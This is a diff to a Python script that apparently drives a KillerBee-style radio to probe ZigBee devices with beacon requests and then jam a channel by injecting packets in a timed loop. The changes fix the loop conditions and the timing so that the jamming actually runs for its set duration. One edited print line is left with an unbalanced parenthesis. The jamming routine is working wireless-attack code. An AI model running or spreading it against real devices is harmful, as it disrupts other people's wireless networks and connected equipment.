@@ -47,7 +47,7 @@ if __name__ == '__main__':
         kb.set_channel(args.channel)
 
         # Send a beacon request and get the response
-        got_beacon_response = True
+        got_beacon_response = False
         beacon_response_bytes = None
         while not got_beacon_response:
             # Send request
@@ -76,7 +76,7 @@ if __name__ == '__main__':
 
         # Wait for another beacon request
         print('3. Listening for a beacon request or orphan notification from another device...')
-        got_beacon_request = True
+        got_beacon_request = False
         counter = 1
         while not got_beacon_request:
             packet = kb.pnext()
@@ -95,12 +95,12 @@ if __name__ == '__main__':
         # Jam for 0.4 sec
         # TODO: Is this method sufficient for jamming?
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        time_start_us = time.time();
+        time_start_sec = time.time();
         elapsed = 0
-        while elapsed < (JAM_TIME_SEC * 100000):
+        while elapsed < JAM_TIME_SEC:
             kb.inject(JAM_PKT_BYTES, None, 10, 0)
-            elapsed = time.time() - time_start_us
-            print('Elapsed: ' + str(round(elapsed / 100000, 2))) + ' sec.'
+            elapsed = time.time() - time_start_sec
+            print('Elapsed: ' + str(round(elapsed, 2)) + ' sec.'
 
         # Increment channel
         # TODO: Are channel scans incremental from 11 to 26?
